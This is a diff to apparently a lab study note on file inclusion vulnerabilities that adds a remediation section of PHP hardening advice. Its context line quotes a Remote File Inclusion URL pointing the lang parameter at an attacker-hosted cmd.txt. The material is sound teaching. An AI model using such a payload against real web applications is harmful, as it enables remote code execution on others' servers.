@@ -33,6 +33,7 @@
   - [Path Traversal](#Path-Traversal)
   - [Local File Inclusion LFI](#Local-File-Inclusion-LFI)
   - [Remote File Inclusion RFI](#Remote-File-Inclusion-RFI)
+  - [Remediation](#Remediation)
 
 
 
@@ -1174,5 +1175,26 @@ The following figure is an example of steps for a successful RFI attack! Let's s
 ```
 
 First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
+
+### Remediation
+
+
+
+As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:
+
+1.    Keep system and services, including web application frameworks, updated with the latest version.
+
+2.    Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
+
+3.    A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
+
+4.    Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.
+
+5.    Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
+
+6.   Never trust user input, and make sure to implement proper input validation against file inclusion.
+
+7.    Implement whitelisting for file names and locations as well as blacklisting.
+
 
 
